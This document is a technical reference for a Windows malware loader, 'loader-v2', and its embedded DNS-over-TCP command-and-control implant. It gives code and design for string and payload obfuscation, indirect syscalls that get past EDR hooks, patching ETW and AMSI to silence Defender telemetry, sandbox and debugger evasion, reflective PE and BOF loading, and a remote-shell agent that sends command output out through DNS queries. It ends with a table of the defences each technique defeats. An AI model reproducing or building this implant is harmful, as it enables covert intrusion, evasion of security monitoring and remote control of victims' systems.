# loader-v2 — Full Technical Reference

**Target:** Windows x64  
**Toolchain:** `x86_64-w64-mingw32-gcc` (MinGW-w64, no CRT linkage)  
**Entry point:** `loader_start` (no `main`, no C runtime startup)

---

## 1. Architecture Overview

```
[Build time]
  mangle.py          → strings_enc.h   (XOR-obfuscated string table)
  encrypt.py + BOF   → payload_enc.h   (RC4-encrypted COFF, split key)

[loader2.exe on disk]
  loader2.c  + strings_enc.h + payload_enc.h
  bof.c      (COFF loader — used for the embedded dns_agent.o at startup)
  indirect.S (indirect syscall stubs)
  ──────────────────────────────────────────────
  IAT: ExitProcess, LoadLibraryA, GetProcAddress, GetTickCount, GetCursorPos
  No Nt*, no AMSI/ETW imports anywhere in the IAT

[Runtime execution order]
  1. PEB walk → ntdll base (no GetModuleHandle)
  2. Init indirect syscalls (SSN harvest + gadget scan)
  3. Sandbox / environment checks
  4. ETW blind (ntdll)
  5. AMSI blind (amsi.dll if loaded)
  6. Benign CPU prelude (~3 min)
  7. RC4 decrypt embedded payload
  8. Dispatch: PE reflective load | COFF BOF exec | raw shellcode
  9. dns_agent_bof.c (the payload): DNS-over-TCP C2 loop forever
```

---

## 2. Build System & Payload Embedding

### 2.1 String obfuscation — `mangle.py`

Every sensitive string (DLL names, function names, protocol constants) is
XOR-encoded at build time with a single-byte key (`SKEY = 0x5A`).

`mangle.py` emits `strings_enc.h`:

```c
/* "ntdll.dll" */
static const uint8_t _S_ntdll_dll[] = {0x34, 0x2e, 0x3a, ...};
#define _L_ntdll_dll 9
```

At runtime the `SGET` macro decodes to a **stack-local buffer**:

```c
#define SGET(var, sym) \
    char var[_L_##sym + 1]; \
    _sdec(var, _S_##sym, _L_##sym)
```

`_sdec` uses a `volatile` key variable to prevent the compiler folding the
XOR at compile time. The decoded string lives only on the stack for the
duration of its use and is never in `.rodata` or `.data`.

**Result:** `strings` / `floss` / `YARA` string scanning of the binary finds
zero plaintext DLL or function names.

### 2.2 Payload encryption — `encrypt.py`

The payload (here: `dns_agent.o`, an x64 COFF) is RC4-encrypted with a
**split key**:

```
real_key   = 16 random bytes   (never written to disk)
key_mask   = 16 random bytes   (stored in payload_enc.h)
masked_key = real_key XOR key_mask  (stored in payload_enc.h)
```

Recovery at runtime:
```c
for (int i = 0; i < RC4_KEY_LEN; i++)
    key[i] = masked_key[i] ^ key_mask[i];
```

Both halves are static byte arrays inside the binary. Neither half alone is
the key; a simple YARA rule on the key bytes would match noise. Static
analysis cannot recover the payload without combining both arrays at runtime.

`payload_enc.h` also stores `ENC_PAYLOAD_SIZE` and the encrypted blob as a
C array compiled directly into the `.data` section of `loader2.exe`.

**Result:** The COFF/BOF payload bytes are never in plaintext on disk. AV
static scan sees encrypted garbage.

---

## 3. Entry Point — `loader_start`

The binary is linked with `-Wl,--entry=loader_start` and `-nostartfiles
-nodefaultlibs`. There is no CRT initialisation, no `_start`, no `WinMain`.
The OS jumps directly to `loader_start`.

This prevents:
- CRT-level heap/TLS init hooks used by some AV products to inject
- The standard `mainCRTStartup` path that some sandboxes monitor

---

## 4. ntdll Resolution — PEB Walk

```c
uint8_t *peb;
__asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
uint8_t *ldr  = *(uint8_t**)(peb + 0x18);
uint8_t *head = ldr + 0x10;   /* InLoadOrderModuleList */
```

`ldr_find` walks `PEB_LDR_DATA.InLoadOrderModuleList` using inline assembly
to read `GS:0x60` (the TEB's PEB pointer on x64). It compares the Unicode
`BaseDllName` field case-insensitively against the decoded string target.

**No `GetModuleHandleA`, no `LoadLibraryA`, no Win32 API call of any kind
is made before this point.** No API call is made before indirect syscall
init either.

`exp_find` then parses the PE export directory (EAT) manually to resolve
named exports — again, no `GetProcAddress`.

---

## 5. Indirect Syscalls

### 5.1 Why indirect syscalls

EDR products hook Nt* functions in ntdll by replacing the first few bytes
with a `jmp` to their inspection code. A **direct** syscall from the binary
(`syscall` in the binary's `.text`) triggers EDR call-stack analysis: the
return address after `syscall` points inside the binary, not ntdll — an
immediate red flag.

**Indirect syscalls** fix this: the `syscall` instruction executes from
inside ntdll's address space. The call stack looks legitimate.

### 5.2 SSN harvesting

`init_syscalls` resolves each Nt* function through `exp_find` (EAT scan,
no GetProcAddress), then scans up to 32 bytes for the instruction pattern:

```
B8 xx 00 00 00    ; mov eax, <SSN>
```

This extracts the System Service Number directly from the function body.
**If the function has been hooked** (the first bytes replaced by a `jmp`),
the scan continues past the hook's trampoline until it finds `B8`. This is
the "Halo's Gate" / "Hell's Gate" variant: hooked stub → scan forward for
the original SSN pattern.

### 5.3 Gadget scan

```c
for (uint32_t i = 0; i < img_sz - 2; i++) {
    if (ntdll[i] == 0x0F && ntdll[i+1] == 0x05 && ntdll[i+2] == 0xC3) {
        g_gadget = ntdll + i;
        break;
    }
}
```

Scans all of ntdll for the byte sequence `0F 05 C3` (`syscall; ret`).
The address of the first occurrence is stored in `g_gadget`.

### 5.4 Stub implementation — `indirect.S`

```asm
IndNtAllocateVirtualMemory:
    mov r10, rcx              ; Windows ABI: first arg in R10 for syscalls
    mov eax, [rip + g_ssn_alloc]
    jmp [rip + g_gadget]      ; jump INTO ntdll — syscall executes there
```

The `jmp` transfers control to the `syscall; ret` gadget inside ntdll.
From the kernel's perspective, and from any call-stack-walking EDR, the
`syscall` originates at a valid ntdll address.

**Five stubs are implemented:**
`NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtFreeVirtualMemory`,
`NtCreateThreadEx`, `NtQuerySystemInformation`

All memory allocation and page-permission changes throughout the entire
loader use these stubs — **zero direct Nt* or VirtualAlloc/VirtualProtect
calls in the binary's IAT**.

---

## 6. Sandbox & Environment Detection

`env_ok()` performs four checks before any payload activity:

| Check | Location | Threshold |
|-------|----------|-----------|
| `PEB.BeingDebugged` | `GS:60h + 2` | Non-zero → exit |
| `PEB.NtGlobalFlag` | `GS:60h + 0xBC` | Bits `0x70` (heap debug flags set by WinDbg/sandbox) → exit |
| `KUSER_SHARED_DATA.KdDebuggerEnabled` | `0x7FFE0000 + 0x2D0` | Bit 0 set → exit |
| System uptime | `GetTickCount()` | < 300 000 ms (5 min) → exit |

The uptime check defeats snapshot-based sandboxes that reset to a fresh
boot state — most sandbox VMs revert to a clean snapshot and restart
execution within seconds or a few minutes.

---

## 7. ETW Blinding

```c
static void blind_etw(uint8_t *ntdll) {
    SGET(s1, etw_write);      // "EtwEventWrite"
    SGET(s2, etw_writefull);  // "EtwEventWriteFull"
    SGET(s3, etw_writeex);    // "EtwEventWriteEx"
    fn = exp_find(ntdll, s1); if (fn) patch_ret(fn);
    ...
}
```

`patch_ret` rewrites the **first byte** of the target function to `0xC3`
(`ret`) using `NtProtectVirtualMemory` (indirect syscall):

1. Page-align the function address.
2. `NtProtectVirtualMemory` → `PAGE_EXECUTE_READWRITE`.
3. Write `0xC3` at byte 0.
4. `NtProtectVirtualMemory` → restore original protection.

After patching, any call to `EtwEventWrite*` returns immediately without
writing any ETW events. **This silences telemetry sent to Windows Defender,
MDE, and any other ETW consumer before the payload is ever mapped.**

Function names are decoded at runtime from `strings_enc.h` — they do not
appear in the binary as plaintext.

---

## 8. AMSI Blinding

`blind_amsi` finds `amsi.dll` in the PEB module list (the XOR-decoded name
`"amsi.dll"` is decoded at runtime). If present, `AmsiScanBuffer` and
`AmsiScanString` are patched to `0xC3` identically to the ETW patch.

AMSI is only present if a PowerShell or .NET host has already loaded it.
The check is a no-op otherwise.

---

## 9. Benign CPU Prelude

The loader spends approximately **3 minutes** performing CPU-intensive
computations before any memory allocation or network activity. This outlasts
most sandbox analysis windows (commonly 30–120 seconds).

### Stage 1 — CRC32 (~1 min)

```c
stage_crc(t0 + 60000UL);
```

Iterates a seeded 512-byte buffer through 2048-pass CRC32 rounds. The
result is written to a `volatile` sink to prevent the compiler from
eliminating the loop. The pattern resembles legitimate file hashing.

### Stage 2 — Monte Carlo π (~2 min)

```c
stage_mc(t0 + 180000UL);
```

Uses a Splitmix64 PRNG to generate random (x, y) pairs and counts how many
fall inside the unit circle. Pure integer arithmetic — no I/O, no memory
allocation — looks like a computation-heavy application.

### Stage 3 — Cursor delta check

```c
GetCursorPos(&p1);
stage_crc(GetTickCount() + 200);  // short burst
GetCursorPos(&p2);
if (p1.x == p2.x && p1.y == p2.y)
    if ((GetTickCount() - t0) < 5000) ExitProcess(0);
```

After the prelude, cursor positions are sampled 200 ms apart during a brief
compute burst. A sandbox that:
1. Has a frozen cursor (no simulated user), AND
2. Reports `GetTickCount` has advanced less than 5 seconds since startup
   (time acceleration to skip sleep/compute)

…causes immediate exit. Real user workstations will have moved the cursor
during the 3-minute prelude.

---

## 10. Payload Decryption

```c
// Recover key at runtime (never stored whole)
for (int i = 0; i < RC4_KEY_LEN; i++)
    key[i] = masked_key[i] ^ key_mask[i];

// Decrypt into fresh NtAllocate'd RW page
uint8_t *raw = nt_alloc(NULL, ENC_PAYLOAD_SIZE, PAGE_READWRITE);
_mcpy(raw, enc_payload, ENC_PAYLOAD_SIZE);
rc4_crypt(S, raw, ENC_PAYLOAD_SIZE);

// Wipe key and RC4 state from stack immediately
_mzero((volatile uint8_t*)key, RC4_KEY_LEN);
_mzero((volatile uint8_t*)S, 256);
```

`_mzero` uses a `volatile` pointer to prevent the compiler from dead-code
eliminating the wipe. After decryption the key material exists only briefly
in stack memory and is actively zeroed.

---

## 11. Payload Dispatch

The decrypted buffer's first two bytes determine execution path:

| Magic | Value | Handler |
|-------|-------|---------|
| `MZ` | `0x5A4D` | Reflective PE loader |
| `d86` (COFF) | `0x8664` | COFF BOF executor (`bof_exec`) |
| anything else | — | Raw shellcode |

This allows loader-v2 to carry **any** payload type without code changes —
swap the payload, rerun `encrypt.py`, rebuild.

---

## 12. Reflective PE Loader

`pe_load` maps a full PE image without `LoadLibraryA`:

1. **Prefer-base allocation** — `NtAllocateVirtualMemory` at the PE's
   preferred `ImageBase`. Falls back to OS-chosen address on failure.
2. **Header copy** — maps `SizeOfHeaders` bytes at offset 0.
3. **Section copy** — maps each section's `SizeOfRawData` bytes from
   `PointerToRawData` to `VirtualAddress`.
4. **Base relocation** — if `delta != 0` (ASLR moved us), walks the
   `.reloc` directory patching `IMAGE_REL_BASED_DIR64` (8-byte absolute
   addresses) and `IMAGE_REL_BASED_HIGHLOW` (4-byte) entries.
5. **IAT resolution** — walks `IMAGE_DIRECTORY_ENTRY_IMPORT`, calls
   `LoadLibraryA` + `GetProcAddress` for each thunk (these Win32 API calls
   are the only IAT entries in the loader itself).
6. **Per-section permissions** — `NtProtectVirtualMemory` (indirect syscall)
   sets each section's final protection from its `Characteristics` flags:
   - `MEM_EXECUTE | MEM_READ` → `PAGE_EXECUTE_READ`
   - `MEM_EXECUTE | MEM_READ | MEM_WRITE` → `PAGE_EXECUTE_READWRITE`
   - `MEM_READ | MEM_WRITE` → `PAGE_READWRITE`
   - `MEM_READ` only → `PAGE_READONLY`
7. **Header wipe** — the first page of the mapped image is zeroed after
   mapping to erase PE headers from memory (defeats in-memory PE scanners
   that look for `MZ`/`PE` at the module base).

---

## 13. COFF / BOF Loader — `bof.c`

When the payload is an x64 COFF (Machine `0x8664`), `bof_exec` runs it
as a Beacon Object File.

### Phase 1 — Section layout

Sections are **page-aligned** (4 KB boundary):

```c
sec_off[i] = block_sz;
block_sz  += (sz + 0xFFFu) & ~(uint64_t)0xFFF;
```

This is critical: per-section `NtProtectVirtualMemory` operates on 4 KB
pages. 16-byte alignment would bleed one section's protection into the
adjacent section. Page-alignment ensures `.text` can be set RX without
touching `.data`.

An IAT slot array (`nsyms * sizeof(void*)`) is appended after the last
section. IAT slots live in the same block for `REL32` range guarantees.

### Phase 2 — Allocation

One `NtAllocateVirtualMemory` call for the entire block with
`PAGE_READWRITE`. All writes (section copy, relocation patching, IAT
population) happen before any protection change.

### Phase 3 — Symbol resolution

For each symbol in the COFF symbol table:

- **Section-relative** (`SectionNumber > 0`): resolved to
  `mem + sec_off[SectionNumber-1] + Value`.
- **External / undefined** (`SectionNumber == 0`):
  1. Check Beacon API shim table (names decoded at runtime from
     `strings_enc.h`): `BeaconOutput`, `BeaconPrintf`, `BeaconDataParse`,
     `BeaconDataExtract`, `BeaconDataInt`, `BeaconDataLength`,
     `BeaconIsAdmin`.
  2. `DLL$Function` format: split at `$`, decode DLL name, `LoadLibraryA`
     + `GetProcAddress`.
  3. Common DLL fallback: scan kernel32, ntdll, user32, advapi32, msvcrt
     (DLL names decoded at runtime, not plaintext).
  - `__imp_` prefixed symbols get an IAT slot: `iat[si] = fn`,
    `sym_addrs[si] = &iat[si]`. The relocation then patches in a pointer
    to the slot, enabling indirect calls identical to normal IAT usage.

### Phase 4 — Relocations

Three types handled:
- `IMAGE_REL_AMD64_ADDR64` (0x0001): 8-byte absolute patch.
- `IMAGE_REL_AMD64_ADDR32NB` (0x0003): 4-byte image-relative patch.
- `IMAGE_REL_AMD64_REL32` (0x0004) through REL32_5 (0x0009): 4-byte
  PC-relative patch with `extra` displacement adjustment.

### Phase 5 — Per-section protection

Only sections with `IMAGE_SCN_MEM_EXECUTE` (`0x20000000`) are flipped:

```c
bof_protect(mem + sec_off[i], sz, PAGE_EXECUTE_READ);
```

`.data` and `.bss` remain `PAGE_READWRITE`. The dns_agent_bof.c COFF has
global state (agent ID, keys, output buffer, connection sockets) that must
survive the C2 loop — they remain writable throughout.

### Phase 6 — Call `go()`

Finds the symbol named `"go"` (decoded at runtime), casts to `void(*)(char*, int)`,
and calls it with the argument blob. For dns_agent_bof.c there are no
arguments; the agent uses compile-time `C2_HOST`/`C2_DOMAIN` constants.

---

## 14. The Payload: `dns_agent_bof.c`

`dns_agent_bof.c` is an x64 COFF that implements a full DNS-over-TCP C2
agent. It is compiled as a position-independent object (`-c`, no linking)
and embedded encrypted in loader2.exe.

### 14.1 No CRT, no Windows headers

All Win32 API calls use the `DLL$Function` BOF import mechanism:

```c
__declspec(dllimport) SOCKET WS2_32$socket(int, int, int);
__declspec(dllimport) BOOL   KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
```

Sensitive string constants (DLL/function names) are XOR-decoded from
`strings_enc.h` at runtime using the same `SGET` macro as loader2.c.
The string table is shared between loader2.c, bof.c, and dns_agent_bof.c.

All helper functions (`_mc`, `_mz`, `_sl`, `_sc`, etc.) are implemented
inline — no `memcpy`, `strlen`, `strcmp` in the COFF's import list.

### 14.2 DNS-over-TCP transport

Each C2 message is sent as a DNS TXT query over **TCP** (not the OS
resolver — raw socket to `C2_HOST:C2_PORT`):

```
[2 bytes big-endian length][DNS packet]
```

The DNS packet encodes the payload in the **query name** in up to three
63-byte labels of Base32 (RFC 4648, no padding):

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.
CCCC.
<agentid>.<domain>.
```

The response payload is in the TXT RDATA of the server's answer.

**Why TCP**: UDP has a 512-byte hard limit before EDNS0; TCP allows up to
65535 bytes per message. Task payloads (BOF COFF objects, command strings)
often exceed 512 bytes. TCP also avoids EDNS0 negotiation complexity.

### 14.3 Packet encryption

All query payloads and server responses are XOR-encrypted with a 4-byte key
derived from the agent ID (8 hex chars → 4 bytes decoded as big-endian
pairs). The agent ID is generated from `CryptGenRandom` during `go()`:

```c
key[i] = (uint8_t)(strtoul(agentid[i*2..i*2+2], 16));
```

Both the C client and the Go server (`dns_server.go`) implement the same
`xorCrypt` / `deriveKey` logic, so the key is implicit in the agent ID
that appears in every query label.

### 14.4 Registration and heartbeat

On startup the agent sends `MSG_REGISTER` (0x01) containing hostname,
username, PID, architecture, OS version, sleep, and jitter.

Every `sleep_jitter()` interval the agent sends `MSG_HEARTBEAT` (0x02).
If the server has pending tasks, the response type is `RESP_TASKS` (0x02)
with a task blob; otherwise `RESP_IDLE` (0x00).

### 14.5 Command dispatch

Two commands are implemented:

**`CMD_SHELL` (0x01)** — executes `cmd.exe /c <command>` with
`CreateProcessA` + anonymous pipes, reads stdout/stderr, and sends the
result back as `MSG_OUTPUT` (0x03).

**`CMD_EXEC_BOF` (0x02)** — runs an external COFF BOF via `bof_exec_sub`
(see below) and sends the accumulated `BeaconOutput` as `MSG_OUTPUT`.

**`CMD_SLEEP` (0x03)** and **`CMD_TERMINATE` (0x04)** adjust sleep
interval and kill the agent respectively.

### 14.6 Multi-chunk output

Output is split into 100-byte chunks (the `OUT_CHUNK` constant), each sent
as a separate DNS query with an incrementing `seq` counter:

```
seq=0: [tid:8][status:1][total:4][first up to 87 bytes of data]
seq=1: [next chunk]
...
```

The server-side `handleOutput` in `dns_server.go` uses a `sync.Map` keyed
by agent ID to reassemble chunks before calling `TsAgentProcessData` with
the complete output.

### 14.7 BOF-in-BOF execution — `bof_exec_sub`

`bof_exec_sub` is a COFF loader embedded inside dns_agent_bof.c, replicating
the functionality of `bof_exec` from bof.c but using only KERNEL32 imports
available in the BOF context (no CRT, no malloc, no `<string.h>`).

**Key differences from `bof.c`:**

| | `bof.c` (outer loader) | `bof_exec_sub` (inner loader) |
|--|--|--|
| Memory alloc | `NtAllocateVirtualMemory` (indirect syscall) | `KERNEL32$VirtualAlloc` (Win32 API) |
| Section alignment | 4 KB (page-aligned — enables per-section protection) | 16-byte (minimal) |
| Protection model | Per-section: `.text` → RX, `.data`/`.bss` → RW | Whole block: `PAGE_EXECUTE_READWRITE` |
| CRT | None | None |
| String table | XOR encoded | XOR encoded (shared `strings_enc.h`) |

**Why RWX for the sub-BOF block**: The inner BOF's sections are 16-byte
aligned. `VirtualProtect` operates on 4 KB pages. Per-section protection
with sub-page-aligned sections bleeds the protection of one section onto
the adjacent section's page — specifically, making `.text` RX also makes
any `.data`/`.bss` on the same 4 KB page RX, causing access violations when
the BOF writes to its own global variables. Using `PAGE_EXECUTE_READWRITE`
from the initial allocation sidesteps this entirely: no `VirtualProtect`
flip is needed.

`FlushInstructionCache` is called after the COFF is loaded to ensure CPU
I-cache coherency before calling `go()`.

### 14.8 VEH crash recovery for sub-BOFs

```c
g_bof_catching = 1;
void *veh = KERNEL32$AddVectoredExceptionHandler(1, (void*)bof_veh_sub);
if (__builtin_setjmp(g_bof_jmpenv) == 0) {
    go_fn((char*)args, (int)alen);
} else {
    /* BOF crashed — clear partial output */
    if(g_bout){ KERNEL32$HeapFree(heap, 0, g_bout); g_bout = 0; }
    g_bout_len = g_bout_cap = 0;
}
g_bof_catching = 0;
KERNEL32$RemoveVectoredExceptionHandler(veh);
```

**Without VEH**: any access violation or illegal instruction inside a BOF's
`go()` propagates as an unhandled exception → WerFault → loader2.exe dies.

**With VEH**: `bof_veh_sub` is registered as the first VEH handler. On any
exception it checks `g_bof_catching`, calls `__builtin_longjmp` back to the
`__builtin_setjmp` save point in `bof_exec_sub`, clears the partial output
buffer, and returns to the normal agent loop. The agent survives the BOF
crash and can receive subsequent commands.

`__builtin_setjmp` / `__builtin_longjmp` are GCC intrinsics that save and
restore `RBP`, `RSP`, and the return address without requiring CRT linkage.
VEH handlers run in the same thread; the `setjmp` frame remains on the
stack when `longjmp` is called, making the unwind safe.

### 14.9 Beacon API shims

BOFs expect a set of `BeaconXxx` functions for output accumulation and
argument parsing. These are provided as inline static functions inside
`dns_agent_bof.c`:

- `BeaconOutput` / `BeaconPrintf` — append to a heap-grown `g_bout` buffer
  via `KERNEL32$HeapReAlloc`.
- `BeaconDataParse` / `BeaconDataExtract` / `BeaconDataInt` /
  `BeaconDataLength` — minimal data-parser shims for argument unpacking.
- `BeaconIsAdmin` — stub returning 0.

The names are exposed via `bsym_name_to_ptr` using the XOR-encoded name
table, so external BOFs that reference `BeaconOutput`, `BeaconPrintf`, etc.
resolve them correctly via the `DLL$Function` / Beacon API lookup path.

---

## 15. Defense Bypass Summary

| Technique | What it defeats |
|-----------|----------------|
| No CRT, custom entry point | CRT startup hooks; some AV injection paths |
| PEB walk for ntdll (no Win32 API) | API monitoring before indirect syscall init |
| Indirect syscalls (`syscall` in ntdll) | EDR call-stack origin checks |
| SSN scan past hooked stubs | Halo's Gate hook bypass |
| XOR-encoded string table (runtime decode to stack) | Static string scanning (`strings`, FLOSS, YARA) |
| RC4 payload + split key (two halves XOR'd at runtime) | Static payload detection; YARA on key material |
| `EtwEventWrite*` → `0xC3` patch | ETW-based telemetry to Defender/MDE/EDR |
| `AmsiScanBuffer/String` → `0xC3` patch | AMSI scanning of in-memory payloads |
| PEB / KUSER_SHARED_DATA debugger checks | Debugger-attached analysis |
| System uptime check (>5 min) | Fresh-snapshot sandbox environments |
| 3-min CPU prelude (CRC32 + Monte Carlo) | Sandbox timeouts (30–120 s analysis windows) |
| Cursor delta + time-acceleration check | Automated sandboxes with simulated user activity |
| PE header wipe after reflective load | In-memory PE scanner `MZ`/`PE` detection |
| Per-section page permissions for PE (no RWX) | Heuristics on RWX memory regions |
| Payload dispatch without IAT (NtAlloc indirect) | API-call based payload staging detection |
| DNS TXT over TCP (raw socket, custom resolver) | Network-layer C2 detection; DNS proxy inspection |
| XOR + Base32 payload encoding in DNS labels | DNS C2 traffic signatures |
| Payload encrypted on wire (agent-ID-derived key) | C2 traffic content inspection |
| BOF execution (no PE on disk or in memory) | Disk and PE-in-memory detection |
| VEH crash recovery for sub-BOFs | Single faulting BOF killing the entire implant |
| COFF import names XOR-decoded at runtime | Import string scanning inside BOF payloads |
